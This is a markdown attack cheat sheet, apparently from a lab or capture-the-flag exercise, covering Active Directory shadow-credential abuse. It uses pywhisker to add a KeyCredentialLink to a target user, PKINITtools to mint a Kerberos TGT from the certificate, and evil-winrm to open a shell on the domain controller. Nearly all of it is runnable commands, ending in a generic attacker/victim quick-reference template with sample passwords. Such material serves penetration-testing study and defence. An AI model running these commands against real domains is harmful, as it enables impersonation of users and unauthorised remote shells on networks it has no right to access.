# Shadow Credentials (pywhisker) → PKINIT TGT → User Shell

**Scenario:** Using `pywhisker` to abuse shadow credentials and add a KeyCredentialLink to a target user account, minting a certificate and authenticating via PKINIT to obtain a Kerberos TGT. With that, we impersonate the user and gain shell access.

---

## Flow
1) **Clone pywhisker** and generate `.pfx` for target user.  
2) **Use PKINITtools** to obtain Kerberos TGT (`gettgtpkinit.py`).  
3) **Export ccache** and configure `/etc/krb5.conf` + `/etc/hosts`.  
4) **Verify with klist**.  
5) **Leverage TGT** in `evil-winrm` for shell.  

References: pywhisker, PKINITtools, oscrypto, evil-winrm.

---

## Setup & OPSEC
- Ensure account used to run pywhisker has rights to add shadow credentials.  
- Work from venv for PKINITtools.  
- Keep `.pfx` + password secure in `/loot/shadowcreds/`.  

---

## Shadow Cred Abuse Generate Certificate
### pywhisker
```bash
git clone https://github.com/ShutdownRepo/pywhisker.git && cd pywhisker/pywhisker

# Example: add keycredential for jpinkman
python3 pywhisker.py --dc-ip DC_IP -d DOMAIN.LOCAL \
  -u wwhite -p 'Password123!' --target jpinkman --action add
```
Output gives `.pfx` file and password (e.g., `1UCYb0YS.pfx` + `1P9EvC2tKKJlBSum4Ej4`).

---

## Convert Certificate Kerberos TGT
### PKINITtools
```bash
cd ~ && git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
python3 -m venv .venv && source .venv/bin/activate
pip3 install -r requirements.txt
pip3 install -I git+https://github.com/wbond/oscrypto.git
```

### Request TGT
```bash
python3 gettgtpkinit.py -cert-pfx ../pywhisker/pywhisker/1UCYb0YS.pfx \
  -pfx-pass '1P9EvC2tKKJlBSum4Ej4' -dc-ip DC_IP DOMAIN.LOCAL/jpinkman \
  /tmp/jpinkman.ccache
```
Generates Kerberos TGT for `jpinkman`.

---

## Kerberos Environment Setup
### Packages + Config
```bash
sudo apt-get install krb5-user -y
echo "DC_IP dc01.domain.local" | sudo tee -a /etc/hosts
sudo nano /etc/krb5.conf
# default_realm = DOMAIN.LOCAL ; kdc = dc01.domain.local
```

### Export Ticket
```bash
export KRB5CCNAME=/tmp/jpinkman.ccache
klist
```
Should list TGT for `jpinkman@DOMAIN.LOCAL`.

---

## Exploitation
### 4.1 Evil-WinRM with Kerberos
```bash
evil-winrm -i dc01.domain.local -r domain.local
```
Uses ticket cache, authenticates as `jpinkman`.

### Grab Flag
```powershell
type C:\Users\jpinkman\Desktop\flag.txt
```

---

## Quick Reference
```bash
# Shadow cred
python3 pywhisker.py --dc-ip DC_IP -d DOMAIN.LOCAL -u attacker -p pass \
  --target victim --action add

# PKINIT
python3 gettgtpkinit.py -cert-pfx victim.pfx -pfx-pass '<pw>' \
  -dc-ip DC_IP DOMAIN.LOCAL/victim /tmp/victim.ccache
export KRB5CCNAME=/tmp/victim.ccache
klist

# Shell
evil-winrm -i dc01.domain.local -r domain.local
```

---

## Tool Links
- pywhisker — https://github.com/ShutdownRepo/pywhisker  
- PKINITtools — https://github.com/dirkjanm/PKINITtools  
- oscrypto fix — https://github.com/wbond/oscrypto  
- evil-winrm — https://github.com/Hackplayers/evil-winrm  
